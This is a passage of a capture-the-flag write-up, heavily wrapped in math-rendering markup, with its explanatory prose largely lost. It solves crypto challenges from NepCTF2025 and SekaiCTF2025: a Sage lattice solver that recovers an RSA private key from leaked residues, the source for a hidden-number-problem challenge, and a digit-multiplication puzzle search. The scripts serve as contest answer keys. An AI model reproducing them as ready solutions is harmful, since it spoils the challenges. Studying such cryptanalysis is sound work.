style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line">primes = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(primes)</span><br><span class="line">d_low = crt(hints,primes)</span><br><span class="line"></span><br><span class="line">mat = [[<span class="number">2</span>^<span class="number">1700</span>, <span class="number">0</span>, e*d_low-<span class="number">1</span>], [<span class="number">0</span>, <span class="number">2</span>^<span class="number">1370</span>, e*M], [<span class="number">0</span>, <span class="number">0</span>, N + <span class="number">1</span>]]</span><br><span class="line">L = Matrix(ZZ, mat)</span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> L.LLL():</span><br><span class="line">    k, K1, _ = res</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">2</span>^<span class="number">1700</span>:</span><br><span class="line">        d = (K1//<span class="number">2</span>^<span class="number">1370</span>)*M + d_low</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">pow</span>(ct,d,N)).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;NepCTF&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><a href="https://eprint.iacr.org/2018/516.pdf">boneh durfeeLSBs P30 Section 5</a><br /><strong>copper</strong><strong>copper</strong><strong>small_roots</strong><strong>boneh durfee</strong><br />()</p><h2 id="reference-2"><a class="markdownIt-Anchor" href="#reference-2"></a> reference</h2><ul><li><a href="https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP">Crypto</a></li><li><a href="https://su1yu4n.github.io/2025/08/01/NepCTF2025-ezRSA2%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3"></a></li></ul><h1 id="nepctf2025-latticebrosing"><a class="markdownIt-Anchor" href="#nepctf2025-latticebrosing"></a> NepCTF2025 - latticebros(ing)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#f(x),f()=0,54236.606188881754809671280151541781895183337725393</span></span><br><span class="line"><span class="comment">#a0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> a0,alpha</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt,log2</span><br><span class="line"></span><br><span class="line">d=<span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line">k=sqrt(log2(p))+log2(log2(p))</span><br><span class="line">B = <span class="number">2</span>**<span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> B &lt; p/<span class="number">2</span>**k</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> m &gt; <span class="number">2</span>*sqrt(log2(p))</span><br><span class="line"></span><br><span class="line">samples = []</span><br><span class="line">betas = []</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;samples.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    t = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    beta = random.randint(-B + <span class="number">1</span>, B - <span class="number">1</span>)</span><br><span class="line">    a = (t * alpha - beta) % p</span><br><span class="line">    samples.append((t, a))</span><br><span class="line">    betas.append(beta)</span><br><span class="line"></span><br><span class="line">f.write(<span class="built_in">str</span>(samples))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">assert</span> (betas[i]-samples[i][<span class="number">0</span>]*alpha+samples[i][<span class="number">1</span>])%p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag = long_to_bytes(alpha)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[(541847931463604073209188621415697353813245102261880389530448, 293760933113243563398917466885108625646262447370201484418246), (235213326900086489464935804156966465366154623411555613791270, 660823982268225103178763707015491421784294988488272636270997), (826464884761457937459245903152143755707241416981488127320435, 428521663319038461250005113612781686761766888058391496085911), (589542000504317435156560078533519448295689695687499354390208, 155284353896000150766154807679279597476176668344402166959399), (968823371588600973965757332601758200815345862153455338808286, 870008943690791009196027169525956126827736285614393106689402), (621636099728440147413990266662022925118216803638588918660041, 265635912066749696542909843111997941904342442664219734956888), (426696569424050102229606043215592727790577655338668728275370, 279313121876980354011480010042682666651614765507190502627689), (89450479064580125731654556963306718472532905610952012502649, 465933125964565419295325650759566635253450915499965633327941), (480355476500393865742379469913983270769356894135485925662119, 894041172171871806404285309781862268351135623868845025443422), (842436524669577199024236805258573090764419350786291073287889, 345478552143958037534551648319293899442551000874041707820740), (650054674429185550652935714084022116516082323269321462104664, 441999979283903658157822753439653947343822546158589507765994), (46289431385578693366971976442426853079852982529357847290686, 625618376463384339878849844467050454204685252824782609369180), (71444185449163133531919043374545893927347050624346741281881, 955925578289311966288639224625142299309823207245807788495453), (192579726169321656812883068526498248523814846320328766176253, 626481822474054336470183912297952839011392733501646931370367), (736527635648804640774976580747540045854351230084566721853611, 276626211757586963928788091386096607703513204646314683038338), (177922521867185878959621840269164617147915792720210315529733, 541058782621716573816245900423919799500476442285991532228641), (40610451174818168154306630612571678739921107216052349044576, 727642592899858828601137105077611015328512898368636299587376), (385012983728389322601149562441674995471397288632464238356283, 353921151307105661267278594470212933060655245893209524497156), (750447975601038834764379841158092390933760641866111445401426, 391626416964965737035878375834907580903143512300198923948189), (115058604943298010958881205548782439407592353731185670266593, 491630592857258949793489206081490523001249620510479961058022), (327389234395954477946639629629085910688793716425320663599360, 24975272330009592102362429346350824580378490147041708568130), (115595274689129534885608766476695918464309130165432995990883, 757961876891952019297626599379744405302595090402128271144165), (950804723308776351161744501221236453742418549093165078282534, 20307246759635231945223392614290397512873344480184942904518), (724537610412063699714461780160573528810830178440136810747811, 149681928388378582933943374524511804362928290938917573644613), (340891278018589324130004945217960336392205386747747011263373, 683307718413135477104477081812052183267507312278283317237187), (104379682905784169840335131193505192063050242530811180817410, 715010230598797717533306270232399781090458356371977748416491), (644160326926600986730919713173510327120201404569141824224075, 127877985489410167008195578625004740882394608402141169695352), (549253388716005399852261816416312267100135940382820676807345, 210560134643237517255193955173709174155305784935427470113433), (968265711632086435506163736279856957220961064226797549228006, 273174723915971720522674140326199419265943707917542063022561), (704367622558261900937184683100177434487519780290678439135652, 959106497548134540301589019840013331842784496835379005298630)]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h1 id="sekaictf2025-i-dream-of-genni"><a class="markdownIt-Anchor" href="#sekaictf2025-i-dream-of-genni"></a> SekaiCTF2025 - I Dream of Genni</h1><blockquote><p>I had the strangest dream last night.<br /><img src="https://pica.zhimg.com/80/v2-9b1b1527b59468d80a3fc9902213e5e3_1440w.png" alt="" /></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter an 8-digit multiplicand: &#x27;</span>))</span><br><span class="line">y = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter a 7-digit multiplier: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">1e6</span> &lt;= y &lt; <span class="number">1e7</span> &lt;= x &lt; <span class="number">1e8</span>, <span class="string">&quot;Incorrect lengths&quot;</span></span><br><span class="line"><span class="keyword">assert</span> x * y != <span class="number">3_81_40_42_24_40_28_42</span>, <span class="string">&quot;Insufficient ntr-opy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dream_multiply</span>(<span class="params">x, y</span>):</span><br><span class="line">    x, y = <span class="built_in">str</span>(x), <span class="built_in">str</span>(y)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(x) == <span class="built_in">len</span>(y) + <span class="number">1</span></span><br><span class="line">    digits = x[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x[<span class="number">1</span>:], y):</span><br><span class="line">        digits += <span class="built_in">str</span>(<span class="built_in">int</span>(a) * <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(digits)</span><br><span class="line"><span class="keyword">assert</span> dream_multiply(x, y) == x * y, <span class="string">&quot;More like a nightmare&quot;</span></span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;75bd1089b2248540e3406aa014dc2b5add4fb83ffdc54d09beb878bbb0d42717e9cc6114311767dd9f3b8b070b359a1ac2eb695cd31f435680ea885e85690f89&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(AES.new(sha256(<span class="built_in">str</span>((x, y)).encode()).digest(), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(ct)).decode())</span><br></pre></td></tr></table></figure><p><code>misc</code></p><p></p><p><code>AI</code>()<strong>wp</strong></p><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pairs = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">if</span> x*y &gt;= <span class="number">10</span>]</span><br></pre></td></tr></table></figure><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">multwo</span>(<span class="params">i, j, digits</span>):</span><br><span class="line">    s, mul = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>((digits+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">        s += (i % <span class="number">10</span>) * (j % <span class="number">10</span>) * mul</span><br><span class="line">        i, j, mul = i // <span class="number">10</span>, j // <span class="number">10</span>, mul * <span class="number">100</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><p><code>process</code><code>pairs</code>()</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">mul = <span class="number">10</span>**digits</span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> pairs:</span><br><span class="line">    x2 = a*mul + x</span><br><span class="line">    y2 = b*mul + y</span><br><span class="line">    <span class="keyword">if</span> (multwo(x2, y2, digits+<span class="number">1</span>) - x2*y2) % (<span class="number">10</span>*mul) == <span class="number">0</span>:</span><br><span class="line">        process(x2, y2, digits+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>(N=7)</p><p><code>y</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>=</mo><msub><mi>d</mi><mn>8</mn></msub><mo></mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mo>+</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">X=d_{8}*10^{7}+x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>d</mi><mn>8</mn></msub><mo></mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo></mo><mi>y</mi><mo>=</mo><msub><mi>d</mi><mn>8</mn></msub><mo></mo><mn>1</mn><msup><mn>0</mn><mn>14</mn></msup><mo>+</mo><mi>m</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi>w</mi><mi>o</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mn>14</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(d_{8}*10^{7}+x)*y=d_{8}*10^{14}+multwo(x,y,14)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">o</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo></mo><mi>y</mi><mo></mo><mi>m</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi>w</mi><mi>o</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mn>14</mn><mo 